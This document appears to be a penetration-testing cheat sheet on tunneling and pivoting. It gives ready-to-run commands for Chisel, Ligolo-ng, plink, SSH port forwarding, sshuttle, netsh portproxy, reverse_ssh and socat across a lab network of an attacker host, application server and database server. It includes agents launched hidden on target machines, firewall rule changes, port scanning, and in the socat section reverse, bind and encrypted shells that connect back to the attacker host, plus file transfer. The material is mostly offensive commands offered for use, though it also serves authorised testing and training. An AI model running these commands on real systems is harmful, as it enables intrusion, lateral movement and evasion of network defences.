# Tunneling

- [Resources](#resources)

## Table of Contents

- [Chisel](#chisel)
- [Ligolo-ng](#ligolo-ng)
- [plink](#plink)
- [Port Forwarding](#port-forwarding-1)
- [Reverse SSH](#reverse-ssh)
- [socat](#socat)
- [simpleproxy](#simpleproxy)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Chisel | A fast TCP/UDP tunnel over HTTP | https://github.com/jpillora/chisel |
| graftcp | A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy. | https://github.com/hmgle/graftcp |
| Ligolo-ng | An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. | https://github.com/nicocha30/ligolo-ng |
| MicroSocks | tiny, portable SOCKS5 server with very moderate resource usage | https://github.com/rofl0r/microsocks |
| Reverse SSH | SSH based reverse shell | https://github.com/NHAS/reverse_ssh |
| socat | Mirror of the socat source code with pre-built releases for Linux (x64 and x86), Windows (x64 and x86), and MacOS (x64) | https://github.com/3ndG4me/socat |

## Chisel

> https://github.com/jpillora/chisel

### Reverse Pivot

#### Server

```console
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```console
$ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
```

##### With PowerShell Start-Process (saps)

```cmd
PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
```

#### Forwaord multiple Ports at once

```console
$ ./chisel client <LHOST>:9002 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002 R:8003:127.0.0.1:8003
```

### SOCKS5 / Proxychains Configuration

#### Server

```console
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```console
$ ./chisel client <LHOST>:9002 R:socks
```

## Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

### Prepare Tunnel Interface

```console
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```console
$ sudo ip link set ligolo up
```

### Setup Proxy on Attacker Machine

```console
$ ./proxy -laddr <LHOST>:443 -selfcert
```

### Setup Agent on Target Machine

```console
$ ./agent -connect <LHOST>:443 -ignore-cert
```

### Configure Session

```console
ligolo-ng » session
```

```console
[Agent : user@target] » ifconfig
```

```console
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

or

```console
$ sudo ip route add 240.0.0.1/32 dev ligolo
```

```console
[Agent : user@target] » start
```

### Port Forwarding

```console
[Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

### Alternative Session Configuration

#### Setup Proxy on Attacker Machine

```console
$ sudo ./proxy -selfcert
```

#### Prepare Tunnel Interface

```console
ligolo-ng » ifcreate --name ligolo
```

#### Add Route to Tunnel Interface

```console
ligolo-ng » route_add --name ligolo --route <SUBNET>
```

#### Setup Agent on Target Machine

```cmd
PS C:\> Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert" -WindowStyle Hidden
```

### Error Handling

#### Fixing tun.New device or resource busy

```console
$ sudo ip link delete ligolo
```

```console
[Agent : user@target] » start
```

## plink

### Remote Port Forwarding

```cmd
C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:3389 <LHOST>
```

## Port Forwarding

### Chisel

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

#### Reverse Pivot

- LHOST < APPLICATION SERVER

##### LHOST

```console
$ ./chisel server -p 9002 -reverse -v
```

##### APPLICATION SERVER

```console
$ ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
```

#### SOCKS5 / Proxychains Configuration

- LHOST > APPLICATION SERVER > NETWORK

##### LHOST

```console
$ ./chisel server -p 9002 -reverse -v
```

##### APPLICATION SERVER

```console
$ ./chisel client 192.168.50.10:9002 R:socks
```

### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

#### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

```console
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

#### Prepare Tunnel Interface

```console
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```console
$ sudo ip link set ligolo up
```

#### Setup Proxy on LHOST

```console
$ ./proxy -laddr 192.168.50.10:443 -selfcert
```

#### Setup Agent on APPLICATION SERVER

```console
$ ./agent -connect 192.168.50.10:443 -ignore-cert
```

#### Configure Session

```console
ligolo-ng » session
```

```console
[Agent : user@target] » ifconfig
```

```console
$ sudo ip r add 172.16.50.0/24 dev ligolo
```

```console
[Agent : user@target] » start
```

#### Port Forwarding

- LHOST < APPLICATION SERVER > DATABASE SERVER

```console
[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
```

### Socat

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > DATABASE SERVER

##### APPLICATION SERVER

```console
$ ip a
$ ip r
$ socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
```

##### LHOST

```console
$ psql -h <RHOST> -p 2342 -U postgres
```

### SSH Tunneling

#### Local Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

##### APPLICATION SERVER

```console
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ ssh <USERNAME>@192.168.100.10
$ ip a
$ ip r
$ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
$ ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
```

##### LHOST

```console
$ smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

#### Dynamic Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

##### APPLICATION SERVER

```console
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
```

##### LHOST

```console
$ sudo ss -tulpn
$ tail /etc/proxychains4.conf
socks5 192.168.50.10 9999
$ proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

#### Remote Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

##### LHOST

```console
$ sudo systemctl start ssh
$ sudo ss -tulpn
```

##### APPLICATION SERVER

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
```

##### LHOST

```console
$ psql -h 127.0.0.1 -p 2345 -U postgres
```

#### Remote Dynamic Port Forwarding

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST < FIREWALL < APPLICATION SERVER > NETWORK

##### APPLICATION SERVER

```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ssh -N -R 9998 <USERNAME>@192.168.50.10
```

##### LHOST

```console
$ sudo ss -tulpn
$ tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

### sshuttle

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

##### APPLICATION SERVER

```console
$ socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

##### LHOST

```console
$ sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
$ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

### ssh.exe

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK

##### LHOST

```console
$ sudo systemctl start ssh
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

##### WINDOWS JUMP SERVER

```cmd
C:\> where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
```

##### LHOST

```console
$ ss -tulpn
$ tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
$ proxychains psql -h 10.10.100.20 -U postgres
```

### Plink

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER

##### LHOST

```console
$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

##### WINDOWS JUMP SERVER

```cmd
C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

##### LHOST

```console
$ ss -tulpn
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

### Netsh

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER

##### LHOST

```console
$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

##### WINDOWS JUMP SERVER

```cmd
C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
C:\> netstat -anp TCP | find "2222"
C:\> netsh interface portproxy show all
C:\> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

##### LHOST

```console
$ sudo nmap -sS 192.168.50.10 -Pn -n -p2222
$ ssh database_admin@192.168.50.10 -p2222
```

##### WINDOWS JUMP SERVER

```cmd
C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

## Reverse SSH

```console
$ git clone https://github.com/NHAS/reverse_ssh
$ cd reverse_ssh
$ make
$ cd bin/
$ cat ~/.ssh/id_rsa.pub > authorized_keys
$ ./server 0.0.0.0:3232
```

```console
$ ./client -d <LHOST>:3232
```

```console
$ ssh <LHOST> -p 3232 ls -t
```

```console
$ ssh -J <LHOST>:3232 1fe03478b2775060f6643adaac57a0f5b99989b3
```

## simpleproxy

```console
$ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
```

## socat

### Port Forwarding

```console
$ socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
$ socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```

### Reverse Shell

#### Option 1

##### Local System

```console
$ socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

##### Remote System

```console
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

#### Option 2

##### Local System

```console
$ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
```

##### Remote System

```console
$ socat tcp-listen:9002,reuseaddr,fork tcp:<RHOST>:5968 &
```

### UDP Shell

#### Local System

```console
$ socat file:`tty`,echo=0,raw udp-listen:<LPORT>
```

### Bind Shell

```console
$ sudo socat OPENSSL-LISTEN:443,cert=<FILE>.pem,verify=0,fork EXEC:/bin/bash
$ socat - OPENSSL:<RHOST>:443,verify=0
```

### Send File

```console
$ sudo socat TCP4-LISTEN:443,fork file:<FILE>
$ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -out <FILE>.crt; cat <FILE>.key <FILE>.crt \> <FILE>.pem
```

### Encrypted Connection

#### Create Certificate

```console
$ openssl req --newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -days 362 -out <FILE>.crt
```

#### Create .pem File

```console
$ cat <FILE>.key <FILE>.crt > <FILE>.pem
```

#### Listener

```console
$ socat OPENSSL-LISTEN:<LPORT>,cert=<FILE>.pem,verify=0 -
```

or

```console
socat OPENSSL-LISTEN:<LPORT> FILE:tty,raw,echo=0,cert=<FILE>.pem,verify=0
```

#### Connect

```console
$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

or

```console
$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```